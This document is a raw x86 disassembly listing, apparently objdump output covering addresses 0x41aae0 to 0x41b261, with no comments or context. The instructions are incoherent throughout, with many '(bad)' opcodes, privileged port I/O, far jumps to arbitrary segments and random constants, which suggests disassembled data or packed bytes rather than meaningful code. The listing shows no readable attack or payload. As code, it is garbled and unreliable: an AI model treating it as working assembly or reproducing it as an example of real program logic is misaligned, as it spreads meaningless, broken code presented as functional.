  41aae0:	sub    BYTE PTR [edi],dl
  41aae2:	jnp    0x41ab1e
  41aae4:	nop
  41aae5:	in     eax,0xa0
  41aae7:	jbe    0x41aaa8
  41aae9:	test   eax,0xb458889
  41aaee:	mov    WORD PTR [ecx+esi*8+0x50a649b4],cs
  41aaf5:	pushf  
  41aaf6:	inc    ebp
  41aaf7:	cmp    al,0x45
  41aaf9:	sub    DWORD PTR [eax+0x2bac4223],0xd74f4ef7
  41ab03:	jnp    0x41aa91
  41ab05:	add    ecx,edi
  41ab07:	in     eax,0xdc
  41ab09:	and    al,0xc0
  41ab0b:	dec    edi
  41ab0c:	mov    ds,WORD PTR [esi+0x74cca2fa]
  41ab12:	push   0x3
  41ab14:	or     bl,BYTE PTR [eax-0x430aa1bb]
  41ab1a:	jnp    0x41aaf9
  41ab1c:	jo     0x41ab2d
  41ab1e:	cmp    al,0x89
  41ab20:	dec    ebp
  41ab21:	xchg   ebx,eax
  41ab22:	cs sbb ebx,edi
  41ab25:	fisttp DWORD PTR [eax+edi*1+0x9d6bcdc]
  41ab2c:	push   ds
  41ab2d:	rcl    esi,1
  41ab2f:	mov    edx,edi
  41ab31:	leave  
  41ab32:	sbb    BYTE PTR [ebp-0x2b],dl
  41ab35:	push   ss
  41ab36:	push   ecx
  41ab37:	shl    DWORD PTR [edx],cl
  41ab39:	add    ebp,DWORD PTR [ebx-0x44]
  41ab3c:	or     al,0x35
  41ab3e:	cli    
  41ab3f:	arpl   WORD PTR [ebx+0x12],cx
  41ab42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab43:	push   cs
  41ab44:	test   eax,0x97aea01d
  41ab49:	int3   
  41ab4a:	cli    
  41ab4b:	(bad)  
  41ab4c:	lahf   
  41ab4d:	sub    al,0x4a
  41ab4f:	inc    edx
  41ab50:	cmc    
  41ab51:	pop    esp
  41ab52:	shl    edx,1
  41ab54:	(bad)  
  41ab55:	jmp    0x89d0:0xe4894234
  41ab5c:	ins    BYTE PTR es:[edi],dx
  41ab5d:	push   eax
  41ab5e:	in     al,dx
  41ab5f:	je     0x41aba6
  41ab61:	mov    bh,0x55
  41ab63:	sbb    al,0xf
  41ab65:	sub    ax,0x1946
  41ab6a:	adc    BYTE PTR [ecx+0x7e],bh
  41ab6d:	mov    dl,0x94
  41ab6f:	pop    esp
  41ab70:	sahf   
  41ab71:	push   0xdbbab2c3
  41ab76:	cmp    dh,BYTE PTR [ecx+0x1d]
  41ab79:	xchg   edi,eax
  41ab7a:	sub    eax,0x9d669e92
  41ab7f:	mov    bh,0x29
  41ab81:	sti    
  41ab82:	popa   
  41ab83:	shl    DWORD PTR [edi-0x43],0x76
  41ab87:	pop    ebx
  41ab88:	fcom   QWORD PTR [ebp-0x1c55e889]
  41ab8e:	mov    esp,0xc9e366b9
  41ab93:	cmp    al,0xe0
  41ab95:	cld    
  41ab96:	ins    DWORD PTR es:[edi],dx
  41ab97:	fnstenv [ebp+0x18c0f932]
  41ab9d:	(bad)  
  41ab9e:	sti    
  41ab9f:	or     DWORD PTR [esi+0x63],ebx
  41aba2:	sub    DWORD PTR ds:0xf93bbb08,0xd0dd3161
  41abac:	faddp  st(7),st
  41abae:	imul   esi,DWORD PTR [eax],0xffffffba
  41abb1:	adc    ch,BYTE PTR [ecx]
  41abb3:	stos   BYTE PTR es:[edi],al
  41abb4:	sub    DWORD PTR [edi+edi*2+0x47497e22],0x87dcd926
  41abbf:	inc    esp
  41abc0:	fsubrp st(1),st
  41abc2:	retf   
  41abc3:	fild   WORD PTR [esi]
  41abc5:	rol    BYTE PTR [eax-0x34],cl
  41abc8:	and    al,0x69
  41abca:	inc    ebp
  41abcb:	es nop
  41abcd:	sbb    bh,BYTE PTR [ebx]
  41abcf:	nop
  41abd0:	dec    edi
  41abd1:	mov    al,0xb
  41abd3:	pop    ds
  41abd4:	mov    ebx,0x828fbe87
  41abd9:	mov    DWORD PTR [esi+edi*8],esp
  41abdc:	xchg   esp,eax
  41abdd:	mov    bh,0xcf
  41abdf:	out    0xed,al
  41abe1:	cdq    
  41abe2:	adc    DWORD PTR [ecx-0x1a3d8a74],ecx
  41abe8:	sub    DWORD PTR [ebx-0x47998baa],0xffffffbd
  41abef:	jecxz  0x41abc5
  41abf1:	dec    eax
  41abf2:	jecxz  0x41ac29
  41abf4:	add    dh,BYTE PTR [edx+0x379c93ae]
  41abfa:	cs call 0xbccc1ca5
  41ac00:	scas   al,BYTE PTR es:[edi]
  41ac01:	inc    ecx
  41ac02:	and    BYTE PTR [esp+edi*4+0x45],bh
  41ac06:	sbb    DWORD PTR [edx+0x5],ecx
  41ac09:	push   eax
  41ac0a:	cs mov eax,0xcae9cdfc
  41ac10:	or     ebp,DWORD PTR [ebx-0x28]
  41ac13:	mov    ds:0xd5d4cdb,al
  41ac18:	(bad)  
  41ac19:	jecxz  0x41ac21
  41ac1b:	outs   dx,BYTE PTR ds:[esi]
  41ac1c:	pop    ebx
  41ac1d:	or     esp,DWORD PTR [esp+eiz*8+0x5b]
  41ac21:	retf   
  41ac22:	inc    esp
  41ac23:	xlat   BYTE PTR ds:[ebx]
  41ac24:	pop    esp
  41ac25:	test   eax,0xdb34e42b
  41ac2a:	xchg   edx,eax
  41ac2b:	dec    eax
  41ac2c:	pop    ebp
  41ac2d:	pop    esi
  41ac2e:	call   0x70dc5864
  41ac33:	int3   
  41ac34:	mov    esp,0x3b05955a
  41ac39:	stos   DWORD PTR es:[edi],eax
  41ac3a:	pop    esi
  41ac3b:	xchg   ecx,eax
  41ac3c:	sub    dl,BYTE PTR [esi+0x55]
  41ac3f:	ret    
  41ac40:	xor    BYTE PTR [esi],bh
  41ac42:	jo     0x41ac89
  41ac44:	(bad)  
  41ac45:	pop    esi
  41ac46:	adc    BYTE PTR [edx-0x36],dh
  41ac49:	cmc    
  41ac4a:	mov    eax,0x1f00e040
  41ac4f:	jle    0x41ac0f
  41ac51:	sahf   
  41ac52:	cmp    BYTE PTR [esi+0x25c83406],bl
  41ac58:	jl     0x41ac65
  41ac5a:	mov    al,0x5f
  41ac5c:	xchg   esp,eax
  41ac5d:	push   ecx
  41ac5e:	xchg   ebx,eax
  41ac5f:	mov    ebx,0x214f72e1
  41ac64:	inc    edi
  41ac65:	adc    DWORD PTR [edi],ebx
  41ac67:	ret    
  41ac68:	gs mov bl,0x70
  41ac6b:	sub    edx,DWORD PTR [ebx]
  41ac6d:	repz push ds
  41ac6f:	fnstenv [esi]
  41ac71:	leave  
  41ac72:	jnp    0x41acc6
  41ac74:	iret   
  41ac75:	and    al,0xa1
  41ac77:	jl     0x41acc6
  41ac79:	js     0x41ac2b
  41ac7b:	mov    dh,0x5c
  41ac7d:	sbb    cl,ah
  41ac7f:	int    0x46
  41ac81:	cs push ss
  41ac83:	imul   eax,DWORD PTR [ecx+0x1ecb631e],0x227eb53e
  41ac8d:	aad    0xd6
  41ac8f:	lea    esp,[edx]
  41ac91:	ins    DWORD PTR es:[edi],dx
  41ac92:	push   edx
  41ac93:	cmp    esp,DWORD PTR [edi]
  41ac95:	pop    esp
  41ac96:	ret    0xe751
  41ac99:	and    edi,esi
  41ac9b:	pushf  
  41ac9c:	or     dh,ah
  41ac9e:	fnstcw WORD PTR [esi+0x4cbff2db]
  41aca4:	xor    dl,bl
  41aca6:	push   es
  41aca7:	out    dx,eax
  41aca8:	and    al,0xe4
  41acaa:	inc    ecx
  41acab:	cdq    
  41acac:	jne    0x41ac40
  41acae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acaf:	mov    ebx,0x6631d19f
  41acb4:	mov    ebx,0x53b0391
  41acb9:	push   0xffffffbc
  41acbb:	dec    edx
  41acbc:	jp     0x41ad3d
  41acbe:	sahf   
  41acbf:	pushf  
  41acc0:	fsub   DWORD PTR [ecx+0x41885960]
  41acc6:	mov    dl,0xcf
  41acc8:	or     DWORD PTR [ecx],ebx
  41acca:	sbb    al,0x7c
  41accc:	pop    ecx
  41accd:	add    eax,DWORD PTR [edi+0x7f]
  41acd0:	and    ebp,ebx
  41acd2:	out    dx,al
  41acd3:	cmp    ch,BYTE PTR [ebp+0xb7dd16f]
  41acd9:	enter  0x96ec,0x6b
  41acdd:	(bad)  
  41acde:	xor    al,BYTE PTR [ebx]
  41ace0:	add    eax,0x501ecd46
  41ace5:	pop    esi
  41ace6:	and    ecx,edx
  41ace8:	into   
  41ace9:	push   eax
  41acea:	sub    ebx,ecx
  41acec:	js     0x41ac7c
  41acee:	adc    ah,BYTE PTR [ebp-0x23]
  41acf1:	mov    DWORD PTR [ebx+ebp*4],edx
  41acf4:	js     0x41ad4e
  41acf6:	sbb    bh,ch
  41acf8:	sar    ch,cl
  41acfa:	stos   DWORD PTR es:[edi],eax
  41acfb:	cld    
  41acfc:	push   esp
  41acfd:	or     ch,BYTE PTR [ebx-0xa]
  41ad00:	aam    0x96
  41ad02:	cmp    DWORD PTR [esi+ebx*4+0xb],edx
  41ad06:	pushf  
  41ad07:	data16 mov fs,WORD PTR [edi+0x2fbe1e07]
  41ad0e:	cmp    ecx,DWORD PTR [edi]
  41ad10:	mov    ds,ebx
  41ad12:	dec    esp
  41ad13:	inc    esi
  41ad14:	push   ss
  41ad15:	int    0xfd
  41ad17:	pusha  
  41ad18:	cs mov eax,0x2a2c3c08
  41ad1e:	call   0xd34a55f1
  41ad23:	or     bh,BYTE PTR [edi+edi*4+0x387fd7ff]
  41ad2a:	cwde   
  41ad2b:	fistp  QWORD PTR [edx]
  41ad2d:	mov    esi,0x4b05fdde
  41ad32:	or     ch,BYTE PTR [ebp+0x38]
  41ad35:	and    edi,0x37ac1387
  41ad3b:	shl    BYTE PTR [esi+ebx*2],0xb6
  41ad3f:	jge    0x41acd4
  41ad41:	mov    ds:0xb83bec5e,al
  41ad46:	adc    DWORD PTR [ecx],edi
  41ad48:	dec    ebx
  41ad49:	mov    cl,bh
  41ad4b:	test   DWORD PTR [eax-0x50],ebp
  41ad4e:	sub    DWORD PTR [esp+ebx*4-0x617a8ed3],0xfa5c93ad
  41ad59:	clc    
  41ad5a:	xor    BYTE PTR [esi+0x27],al
  41ad5d:	add    ebx,esi
  41ad5f:	inc    eax
  41ad60:	sub    ecx,DWORD PTR [eax+0x3f]
  41ad63:	mov    bh,0x84
  41ad65:	stos   BYTE PTR es:[edi],al
  41ad66:	add    dl,BYTE PTR [ebx]
  41ad68:	sub    dh,BYTE PTR [ebx]
  41ad6a:	fimul  WORD PTR [ebx+eax*1]
  41ad6d:	dec    ebp
  41ad6e:	or     BYTE PTR [edi],ch
  41ad70:	sbb    dh,BYTE PTR [edx+0x635b6fc8]
  41ad76:	fadd   QWORD PTR [esi+edi*1+0x32]
  41ad7a:	mov    cl,0xa8
  41ad7c:	sub    DWORD PTR [ebx+0x726abc5c],ecx
  41ad82:	push   edx
  41ad83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad84:	xor    al,bl
  41ad86:	mov    edi,0x13ee8b6d
  41ad8b:	test   DWORD PTR [edi],0xb6b0f660
  41ad91:	(bad)  
  41ad93:	xor    eax,DWORD PTR [edx+ebp*8+0x166b1ff8]
  41ad9a:	rol    DWORD PTR [eax-0xa],0xd0
  41ad9e:	xor    eax,0x31628bce
  41ada3:	arpl   WORD PTR [edi],cx
  41ada5:	sub    eax,0x4844a600
  41adaa:	fsubr  DWORD PTR [eax+ebp*8+0x68bbf34b]
  41adb1:	xchg   ecx,eax
  41adb2:	fstp   QWORD PTR [ecx]
  41adb4:	push   ecx
  41adb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adb6:	neg    DWORD PTR [ebp+edx*2+0x5e430ec7]
  41adbd:	or     al,0xc5
  41adbf:	mov    cl,0xdc
  41adc1:	mov    eax,ds:0xb3bd1951
  41adc6:	out    dx,al
  41adc7:	repnz xchg ebx,eax
  41adc9:	inc    ebx
  41adca:	dec    ecx
  41adcb:	fwait
  41adcc:	jno    0x41adbf
  41adce:	or     al,0x44
  41add0:	mov    al,ds:0x1e9821eb
  41add5:	sbb    dh,dl
  41add7:	shl    dl,cl
  41add9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adda:	push   eax
  41addb:	sub    al,0x1b
  41addd:	cmp    edx,DWORD PTR [esi-0x34]
  41ade0:	jns    0x41ad7a
  41ade2:	sub    DWORD PTR [ebx-0x31],edi
  41ade5:	and    dl,BYTE PTR [esi]
  41ade7:	sub    edi,ecx
  41ade9:	ror    DWORD PTR [eax+0x6cad8511],1
  41adef:	mov    esi,0x39ead1ac
  41adf4:	xor    BYTE PTR [esi],dh
  41adf6:	pop    esi
  41adf7:	test   DWORD PTR [esi],0xbaec7327
  41adfd:	jae    0x41ae6a
  41adff:	mov    esp,ebp
  41ae01:	repnz cld 
  41ae03:	clc    
  41ae04:	xor    eax,0xd8466151
  41ae09:	jmp    0x7c3c:0xa67da063
  41ae10:	xchg   BYTE PTR [ecx-0x31],dh
  41ae13:	sbb    al,BYTE PTR [ebp-0x1dfd0da6]
  41ae19:	mov    ds:0x153383dc,al
  41ae1e:	mov    ds:0x1b9d500b,al
  41ae23:	stc    
  41ae24:	mov    edx,0x73f5a2d7
  41ae29:	jmp    0xd15022ba
  41ae2e:	adc    eax,0xfc7af3e
  41ae33:	jno    0x41adbb
  41ae35:	std    
  41ae36:	scas   al,BYTE PTR es:[edi]
  41ae37:	pop    ds
  41ae38:	add    BYTE PTR [esp+esi*2],al
  41ae3b:	or     bh,cl
  41ae3d:	ftst   
  41ae3f:	and    DWORD PTR [di-0x31],edx
  41ae43:	ins    BYTE PTR es:[edi],dx
  41ae44:	and    al,ah
  41ae46:	es jmp 0xb443fe03
  41ae4c:	in     eax,0xb2
  41ae4e:	mov    ch,0xd8
  41ae50:	cmp    eax,DWORD PTR [ebx-0x25]
  41ae53:	in     eax,dx
  41ae54:	cmp    bh,BYTE PTR [esi-0x4959c86]
  41ae5a:	xor    DWORD PTR [ebp+esi*8+0x0],ebp
  41ae5e:	sub    DWORD PTR [esi+0x18],0x6f
  41ae62:	mov    eax,ds:0xd00afa57
  41ae67:	cmp    al,0xbf
  41ae69:	adc    dl,BYTE PTR [edx+ebx*1+0x13]
  41ae6d:	sub    al,0x35
  41ae6f:	enter  0x435,0xcb
  41ae73:	(bad)  
  41ae74:	in     eax,dx
  41ae75:	fnsave [ebp-0x655b3635]
  41ae7b:	push   ebx
  41ae7c:	xor    DWORD PTR [ebp+0x23],edx
  41ae7f:	lea    edi,[edx+0x32]
  41ae82:	(bad)  
  41ae83:	pop    ds
  41ae84:	aad    0xc6
  41ae86:	sahf   
  41ae87:	jp     0x41ae34
  41ae89:	icebp  
  41ae8a:	out    dx,al
  41ae8b:	mov    eax,0x120a4aff
  41ae90:	das    
  41ae91:	add    BYTE PTR [edi-0x1897c6e1],bh
  41ae97:	or     al,0x55
  41ae99:	jmp    0x64dd:0x7d555807
  41aea0:	fisttp QWORD PTR [eax-0x6b]
  41aea3:	pop    ecx
  41aea4:	mov    edx,0xadc7bbcd
  41aea9:	dec    esp
  41aeaa:	jae    0x41aed4
  41aeac:	dec    eax
  41aead:	push   eax
  41aeae:	(bad)  
  41aeaf:	or     al,0x3b
  41aeb1:	inc    ebp
  41aeb2:	inc    edi
  41aeb3:	xor    DWORD PTR [ebp+0x39c90834],ecx
  41aeb9:	pop    ds
  41aeba:	jle    0x41aee6
  41aebc:	cmp    ax,0x3ad0
  41aec0:	push   ebx
  41aec1:	daa    
  41aec2:	inc    edx
  41aec3:	imul   ebp,DWORD PTR [esi-0x1e],0xffffff87
  41aec7:	push   ds
  41aec8:	fcomp  DWORD PTR [edi]
  41aeca:	dec    edx
  41aecb:	test   edx,ebp
  41aecd:	nop
  41aece:	xor    al,0xa
  41aed0:	gs mov ch,0x38
  41aed3:	mov    edi,0x48a6e74c
  41aed8:	popa   
  41aed9:	sub    BYTE PTR [ecx-0x3df001fa],0x89
  41aee0:	xchg   ebx,eax
  41aee1:	inc    ebx
  41aee2:	fistp  DWORD PTR [esi+0x1f]
  41aee5:	ss or  esp,DWORD PTR fs:[edi+0x1d281d77]
  41aeed:	lods   eax,DWORD PTR ds:[esi]
  41aeee:	pop    ecx
  41aeef:	(bad)  
  41aef0:	xor    edx,DWORD PTR [eax]
  41aef2:	div    BYTE PTR [edx]
  41aef4:	call   0xef18:0x1819dafc
  41aefb:	inc    edi
  41aefc:	(bad)  
  41aefd:	js     0x41aefb
  41aeff:	jmp    0x41af79
  41af01:	loope  0x41af39
  41af03:	dec    edx
  41af04:	adc    ch,bh
  41af06:	xchg   edi,eax
  41af07:	sub    BYTE PTR [edi+0x1484daf6],al
  41af0d:	xlat   BYTE PTR ds:[ebx]
  41af0e:	es test al,al
  41af11:	shr    DWORD PTR [edx-0x28],0x29
  41af15:	add    BYTE PTR [ebx-0x3e995772],al
  41af1b:	adc    DWORD PTR [ebp+0x48],eax
  41af1e:	jne    0x41af3f
  41af20:	fadd   DWORD PTR [edi-0x4]
  41af23:	xchg   esi,eax
  41af24:	jmp    0x2bca497f
  41af29:	mov    BYTE PTR ds:0x1b5be2a8,cl
  41af2f:	cmp    al,0x7b
  41af31:	outs   dx,BYTE PTR ds:[esi]
  41af32:	lahf   
  41af33:	push   es
  41af34:	into   
  41af35:	aam    0x7d
  41af37:	stos   BYTE PTR es:[edi],al
  41af38:	xchg   ecx,eax
  41af39:	mov    al,0x2e
  41af3b:	mov    ds:0xe0dfdbd9,al
  41af40:	add    BYTE PTR [ebp-0x435510eb],bl
  41af46:	sbb    eax,0xe3cc1229
  41af4b:	sbb    al,0x34
  41af4d:	add    cl,bl
  41af4f:	scas   eax,DWORD PTR es:[edi]
  41af50:	cmc    
  41af51:	push   esp
  41af52:	xor    DWORD PTR [eax+0x8],ebp
  41af55:	nop
  41af56:	jg     0x41af15
  41af58:	sbb    DWORD PTR [edi+0x4b525ad],edx
  41af5e:	(bad)  
  41af5f:	out    0x90,eax
  41af61:	sahf   
  41af62:	sub    BYTE PTR [edi-0x129448d3],dl
  41af68:	sub    al,0xa2
  41af6a:	and    eax,DWORD PTR [esi+0xc]
  41af6d:	pop    edi
  41af6e:	xchg   ebp,eax
  41af6f:	inc    ebx
  41af70:	(bad)  
  41af71:	shl    DWORD PTR [edi-0x384bc230],1
  41af77:	jae    0x41afae
  41af79:	hlt    
  41af7a:	and    eax,0xe21a3f93
  41af7f:	fwait
  41af80:	mov    cl,0x6e
  41af82:	hlt    
  41af83:	gs out dx,eax
  41af85:	xor    esp,esi
  41af87:	cmp    bh,BYTE PTR ds:0x3bd07fe4
  41af8d:	jnp    0x41af2d
  41af8f:	std    
  41af90:	fiadd  DWORD PTR [edx]
  41af92:	fstp   TBYTE PTR [esi-0x18]
  41af95:	sub    eax,0x1f8460e1
  41af9a:	jge    0x41b00a
  41af9c:	dec    ecx
  41af9d:	out    0x3c,al
  41af9f:	jae    0x41af75
  41afa1:	pop    ecx
  41afa2:	shl    BYTE PTR [ecx],0xe0
  41afa5:	rol    DWORD PTR [edi+0x17c6099e],1
  41afab:	xchg   esi,eax
  41afac:	cmp    BYTE PTR [ecx],bh
  41afae:	(bad)  
  41afb0:	and    eax,0x8d94639d
  41afb5:	jne    0x41af7d
  41afb7:	adc    ebp,esi
  41afb9:	stos   DWORD PTR es:[edi],eax
  41afba:	in     al,0x60
  41afbc:	pop    ecx
  41afbd:	aad    0x97
  41afbf:	rcr    BYTE PTR [ecx-0x5f],1
  41afc2:	cmp    ch,BYTE PTR [ebp+edx*2+0x235470c7]
  41afc9:	(bad)  
  41afcb:	or     dl,BYTE PTR [ebx]
  41afcd:	sahf   
  41afce:	and    al,0x29
  41afd0:	fwait
  41afd1:	mov    ah,0x9a
  41afd3:	inc    ebx
  41afd4:	test   DWORD PTR [esi+esi*1-0xd96c75],ebp
  41afdb:	data16 add al,0x28
  41afde:	add    eax,0xce9314ed
  41afe3:	push   ebx
  41afe4:	rcr    bh,0x89
  41afe7:	and    al,0xd
  41afe9:	scas   eax,DWORD PTR es:[edi]
  41afea:	sbb    ecx,DWORD PTR [ecx]
  41afec:	xchg   DWORD PTR [esi-0x54239410],esi
  41aff2:	mov    cl,BYTE PTR [edi]
  41aff4:	mov    ah,0x6c
  41aff6:	sub    dh,ch
  41aff8:	test   eax,0x70df9fd1
  41affd:	cli    
  41affe:	mov    ebp,0xf4964cc1
  41b003:	xlat   BYTE PTR ds:[ebx]
  41b004:	out    dx,al
  41b005:	out    0x9d,eax
  41b007:	push   edx
  41b008:	rol    BYTE PTR [eax],1
  41b00a:	fisttp WORD PTR [esi-0x70]
  41b00d:	mov    WORD PTR [eax-0x19],?
  41b010:	mov    edx,0xd62f82b8
  41b015:	inc    esi
  41b016:	jle    0x41b079
  41b018:	or     eax,0xf71f22ff
  41b01d:	adc    BYTE PTR [ebp-0x12eda4b1],dl
  41b023:	(bad)  
  41b024:	js     0x41b00b
  41b026:	or     eax,DWORD PTR [ebx+esi*8]
  41b029:	dec    edx
  41b02a:	jle    0x41aff8
  41b02c:	xchg   esi,eax
  41b02d:	mov    ds:0x9199e539,al
  41b032:	dec    ecx
  41b033:	add    edx,DWORD PTR [eax]
  41b035:	mov    ebp,fs
  41b037:	inc    esi
  41b038:	loopne 0x41b052
  41b03a:	dec    ecx
  41b03b:	xchg   esi,eax
  41b03c:	xchg   esi,eax
  41b03d:	sbb    esi,esp
  41b03f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b040:	std    
  41b041:	(bad)  [ebx]
  41b043:	cmp    ebx,edi
  41b045:	jp     0x41b03d
  41b047:	(bad)  
  41b048:	dec    esi
  41b049:	rol    ch,1
  41b04b:	push   ss
  41b04c:	mov    ebp,0x67f3efac
  41b051:	mov    ebp,0xffd3397d
  41b056:	and    bh,cl
  41b058:	ins    DWORD PTR es:[edi],dx
  41b059:	dec    edi
  41b05a:	add    al,0xa9
  41b05c:	lahf   
  41b05d:	sbb    ch,BYTE PTR [ebx]
  41b05f:	add    DWORD PTR [edi-0x4a],ebx
  41b062:	push   0xf37cb1a
  41b067:	push   0x7f1e0611
  41b06c:	sub    eax,0x7b2199a0
  41b071:	sub    edx,DWORD PTR [edi+0x3f]
  41b074:	out    dx,al
  41b075:	mov    ebx,0xead3e254
  41b07a:	in     al,dx
  41b07b:	jmp    0xb701:0x7f68c4d6
  41b082:	jb     0x41b00a
  41b084:	stos   DWORD PTR es:[edi],eax
  41b085:	lock pop edx
  41b087:	gs mov dh,0x3d
  41b08a:	dec    ebp
  41b08b:	imul   esi,eax,0x6653f4a0
  41b091:	xor    DWORD PTR [ebp+ecx*1-0x6b63d5c7],ecx
  41b098:	jo     0x41b023
  41b09a:	call   0x7359:0xfc82d985
  41b0a1:	enter  0x1be6,0x2f
  41b0a5:	fbld   TBYTE PTR [edi]
  41b0a7:	jno    0x41b076
  41b0a9:	xchg   esp,eax
  41b0aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0ab:	rol    dl,1
  41b0ad:	inc    ecx
  41b0ae:	psadbw mm5,mm1
  41b0b1:	repnz cmp eax,0xf2469a6c
  41b0b7:	sbb    BYTE PTR [ebp+0x1b0f8218],ah
  41b0bd:	(bad)  
  41b0be:	pop    ebp
  41b0bf:	adc    BYTE PTR ds:0xe77252cf,al
  41b0c5:	push   eax
  41b0c6:	and    dh,BYTE PTR [eax-0x1aaad27b]
  41b0cc:	ror    DWORD PTR [edi-0x70c6f39b],1
  41b0d2:	jmp    0x9165:0x8128928f
  41b0d9:	test   cl,al
  41b0db:	ins    BYTE PTR es:[edi],dx
  41b0dc:	push   ebp
  41b0dd:	repz int3 
  41b0df:	inc    ebx
  41b0e0:	pop    es
  41b0e1:	je     0x41b155
  41b0e3:	mov    esi,DWORD PTR [edi+0x39]
  41b0e6:	pushf  
  41b0e7:	push   ds
  41b0e8:	aas    
  41b0e9:	and    DWORD PTR [edx+ebp*8-0x55],0x1e
  41b0ee:	mov    edi,0xf6c4ae60
  41b0f3:	fisttp WORD PTR [edi+0x5a]
  41b0f6:	mov    al,0x8
  41b0f8:	sub    eax,DWORD PTR [ebx-0x4cc25ef1]
  41b0fe:	push   ecx
  41b0ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b100:	add    BYTE PTR [ebp-0x2de27a8d],ah
  41b106:	rol    DWORD PTR [ebp+ebp*2+0x7d],cl
  41b10a:	mov    ebp,0x62232ae9
  41b10f:	mov    bh,0x2c
  41b111:	push   cs
  41b112:	std    
  41b113:	push   es
  41b114:	hlt    
  41b115:	mov    al,0xd2
  41b117:	out    0x9d,eax
  41b119:	add    ecx,DWORD PTR [ebp+0x25345ed8]
  41b11f:	xchg   ebp,eax
  41b120:	xlat   BYTE PTR ds:[ebx]
  41b121:	rcl    DWORD PTR [ecx+eiz*4-0x7c],cl
  41b125:	loope  0x41b175
  41b127:	push   esp
  41b128:	add    al,0xc5
  41b12a:	add    BYTE PTR [esi+0x2],0xd2
  41b12e:	pop    eax
  41b12f:	fstp   QWORD PTR [ecx+ebx*1]
  41b132:	mov    es,WORD PTR [esi]
  41b134:	mov    ds:0x5b8e2c38,al
  41b139:	jno    0x41b0ff
  41b13b:	jmp    0x41b0c0
  41b13d:	xor    bh,BYTE PTR [ebp-0xbf1c694]
  41b143:	fidivr WORD PTR ds:0x71012260
  41b149:	xor    al,0x5b
  41b14b:	in     al,0x62
  41b14d:	xor    DWORD PTR [ebp-0x55b7a2d6],ecx
  41b153:	mov    ebx,0xa9912c3e
  41b158:	mov    esp,0x3023b7a9
  41b15d:	push   0x18
  41b15f:	lods   eax,DWORD PTR ds:[esi]
  41b160:	pop    es
  41b161:	outs   dx,DWORD PTR ds:[esi]
  41b162:	xchg   ebp,eax
  41b163:	and    edi,0x35
  41b166:	dec    ebp
  41b167:	cmp    al,0x70
  41b169:	jo     0x41b15a
  41b16b:	mov    al,0x7a
  41b16d:	mov    ds:0xebfc7e9c,al
  41b172:	in     al,0xe5
  41b174:	dec    ecx
  41b175:	pop    esp
  41b176:	cmp    DWORD PTR [eax-0x77],0x25cdd00d
  41b17d:	inc    edx
  41b17e:	mov    eax,ds:0x44bc726a
  41b183:	out    dx,al
  41b184:	ja     0x41b120
  41b186:	pop    ebx
  41b187:	pop    es
  41b188:	lods   eax,DWORD PTR ds:[esi]
  41b189:	cs and al,0xbc
  41b18c:	xor    bl,ah
  41b18e:	es jg  0x41b1bc
  41b191:	enter  0x4400,0xc1
  41b195:	retf   0x14e9
  41b198:	mov    cl,0x1
  41b19a:	or     al,BYTE PTR [ebp+eax*8-0x39]
  41b19e:	jmp    0x41b12a
  41b1a0:	(bad)  
  41b1a1:	in     eax,0x24
  41b1a3:	mov    bh,0x26
  41b1a5:	imul   ecx,DWORD PTR [eax],0xf302e545
  41b1ab:	inc    edi
  41b1ac:	push   cs
  41b1ad:	(bad)  
  41b1ae:	stc    
  41b1af:	fwait
  41b1b0:	xchg   esi,eax
  41b1b1:	jmp    0x1f38:0x1863b70c
  41b1b8:	orps   xmm2,xmm0
  41b1bb:	mov    esp,0xede2caf4
  41b1c0:	mov    ebp,DWORD PTR [edi+0x70675290]
  41b1c6:	inc    esi
  41b1c7:	xchg   edx,eax
  41b1c8:	pop    esi
  41b1c9:	mov    cl,0x33
  41b1cb:	dec    edi
  41b1cc:	je     0x41b192
  41b1ce:	mov    bh,0xa5
  41b1d0:	test   al,0xa7
  41b1d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1d3:	push   ss
  41b1d4:	jecxz  0x41b205
  41b1d6:	xor    DWORD PTR [esi+0x43a00266],ebp
  41b1dc:	xchg   ebx,eax
  41b1dd:	or     edi,edi
  41b1df:	(bad)  
  41b1e0:	adc    eax,0x790be72f
  41b1e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1e6:	das    
  41b1e7:	or     edi,edi
  41b1e9:	rcr    BYTE PTR [ecx],cl
  41b1eb:	xlat   BYTE PTR ds:[ebx]
  41b1ec:	and    DWORD PTR [ebp+0x2f],eax
  41b1ef:	mov    edi,0x724319b0
  41b1f4:	xor    eax,0x6d48fcc3
  41b1f9:	ret    0x76b9
  41b1fc:	jg     0x41b241
  41b1fe:	ja     0x41b1b4
  41b200:	call   0x2a4a7b00
  41b205:	push   ebp
  41b206:	gs xchg esi,eax
  41b208:	lahf   
  41b209:	mov    cl,0xf9
  41b20b:	ins    BYTE PTR es:[edi],dx
  41b20c:	xor    ebp,DWORD PTR [edi+eax*1]
  41b20f:	mov    ebp,0xa57f2027
  41b214:	jge    0x41b23e
  41b216:	bound  eax,QWORD PTR [ebx-0xbd612b5]
  41b21c:	fwait
  41b21d:	mov    eax,ds:0x33af27b2
  41b222:	scas   al,BYTE PTR es:[edi]
  41b223:	cmp    ecx,DWORD PTR [ebx+0x34cfedea]
  41b229:	add    edx,esp
  41b22b:	stos   DWORD PTR es:[edi],eax
  41b22c:	mov    edx,0x385ca19d
  41b231:	cmc    
  41b232:	call   0xa516:0x4624
  41b238:	ins    DWORD PTR es:[edi],dx
  41b239:	data16 mov dh,0x1b
  41b23c:	and    dh,ch
  41b23e:	sbb    BYTE PTR [ebx],dl
  41b240:	test   al,0x45
  41b242:	dec    esp
  41b243:	pop    ebp
  41b244:	jl     0x41b246
  41b246:	mov    ah,0x70
  41b248:	nop
  41b249:	dec    ch
  41b24b:	push   ds
  41b24c:	enter  0xd70d,0xa
  41b250:	fdivr  QWORD PTR [eax+0x511098a3]
  41b256:	(bad)  
  41b257:	adc    al,0xaf
  41b259:	pop    ds
  41b25a:	add    ebx,DWORD PTR [ebp+0x2b]
  41b25d:	je     0x41b279
  41b25f:	sub    ebx,edi
  41b261:	adc    eax,0x666d0607
